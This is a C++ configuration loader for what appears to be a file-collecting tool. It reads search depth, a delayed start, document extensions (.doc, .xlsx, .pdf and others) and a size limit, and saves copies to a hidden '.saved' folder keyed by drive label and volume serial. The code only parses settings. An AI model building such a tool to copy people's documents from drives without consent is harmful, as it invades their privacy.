#include "Config.h"
#include "Utils.h"
#include <filesystem>
#include <fstream>
#include <SimpleIni.h>
#include <algorithm>
#include <cctype>
#include <iostream>

namespace fs = std::filesystem;

// 使用原子变量保证线程安全
std::atomic<int> searchMaxDepth{5};
std::atomic<int> delayStart{30};
std::vector<std::string> fileExts;
std::atomic<std::uintmax_t> fileSizeLimit{0};
std::string saveDir = "./.saved/<drivelabel>_<volumeserial>/";
std::atomic<bool> skipDuplicateFile{false};

bool InitConfig() {
    const std::string configPath = "config.ini";
    
    if (!fs::exists(configPath)) {
        std::ofstream fout(configPath);
        fout << R"([Main]
SearchMaxDepth=5
DelayStart=30
FileExts=.doc|.ppt|.xls|.docx|.pptx|.xlsx|.txt|.pdf
FileSizeLimit=1000MB
SavePath=./.saved/<drivelabel>_<volumeserial>/
SkipDuplicateFile=true
)";
        return false;
    }

    CSimpleIniA ini;
    ini.SetUnicode();
    if (ini.LoadFile(configPath.c_str()) < 0) return false;

    // 使用原子操作更新配置
    searchMaxDepth.store(ini.GetLongValue("Main", "SearchMaxDepth", 5));
    delayStart.store(ini.GetLongValue("Main", "DelayStart", 30));
    skipDuplicateFile.store(ini.GetBoolValue("Main", "SkipDuplicateFile", true));

    // 文件扩展名处理
    const auto extsStr = std::string(ini.GetValue("Main", "FileExts", ""));
    fileExts = extsStr.empty() ? std::vector<std::string>{} : SplitStrWithPattern(extsStr, "|");

    // 文件大小解析
    const auto sizeLimitStr = std::string(ini.GetValue("Main", "FileSizeLimit", "0"));
    if (const auto size = ParseFileSize(sizeLimitStr)) {
        fileSizeLimit.store(*size);
    } else {
        fileSizeLimit.store(0);
    }

    // 保存路径处理
    saveDir = ini.GetValue("Main", "SavePath", "./.saved/<drivelabel>_<volumeserial>/");
    if (saveDir.find(":") == std::string::npos) {
        saveDir = (fs::current_path() / saveDir).lexically_normal().string();
    } else {
        saveDir = fs::path(saveDir).lexically_normal().string();
    }

    std::cout << "[INFO] Saving to " << saveDir << "\n";
    std::cout << "[INFO] Config data loaded.\n";
    return true;
}

// 线程安全的访问器
int GetSearchMaxDepth() { return searchMaxDepth.load(); }
int GetDelayStart() { return delayStart.load(); }
const std::vector<std::string>& GetFileExts() { return fileExts; }
std::uintmax_t GetFileSizeLimit() { return fileSizeLimit.load(); }
std::string GetSaveDir() { return saveDir; }
bool GetSkipDuplicateFile() { return skipDuplicateFile.load(); }